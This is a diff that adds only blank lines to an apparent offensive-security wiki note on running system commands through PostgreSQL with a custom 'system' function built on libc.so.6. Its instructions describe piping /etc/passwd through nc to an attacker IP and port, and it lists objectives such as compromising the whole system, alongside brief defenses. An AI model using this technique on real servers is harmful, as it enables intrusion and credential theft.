@@ -32,6 +32,8 @@ To execute commands using this technique, attackers must first identify a vulner
 
 By executing commands on a PostgreSQL server, attackers can gain access to sensitive data, compromise the system, and launch further attacks against other systems in the network.
 
+ 
+
 ## Requirements
 
 1. Access to the vulnerable PostgreSQL server
@@ -39,6 +41,8 @@ By executing commands on a PostgreSQL server, attackers can gain access to sensi
 1. Knowledge of the vulnerability and the libc.so.6 library
 
 1. Tools to execute the 'Execute Command and Send /etc/passwd to Attacker IP' command
+
+ 
 
 ## Defense
 
@@ -48,6 +52,8 @@ By executing commands on a PostgreSQL server, attackers can gain access to sensi
 
 1. Monitor network traffic for suspicious activity and anomalous behavior
 
+ 
+
 ## Objectives
 
 1. Execute arbitrary commands on the PostgreSQL server
@@ -56,11 +62,19 @@ By executing commands on a PostgreSQL server, attackers can gain access to sensi
 
 1. Compromise the entire system
 
+ 
+
 # Instructions
 
 1. Run the following SQL command to execute a system command and send the contents of the /etc/passwd file to an attacker controlled IP address and port.
 
+ 
+
+
+
 **Code**: [[CREATE OR REPLACE FUNCTION system(cstring) RETURNS]]
+
+
 
 > This command creates a SQL function called 'system' that can execute arbitrary system commands. The SELECT statement then uses this function to execute the command 'cat /etc/passwd | nc <attacker IP> <attacker port>', which sends the contents of the /etc/passwd file to the specified IP address and port using the 'nc' command. This can be used by an attacker to exfiltrate sensitive information such as user account credentials.
 
@@ -79,3 +93,5 @@ By executing commands on a PostgreSQL server, attackers can gain access to sensi
 - [[PostgreSQL Command execution]]
 - [[PostgreSQL injection]]
 - [[Using libc.so.6]]
+
+
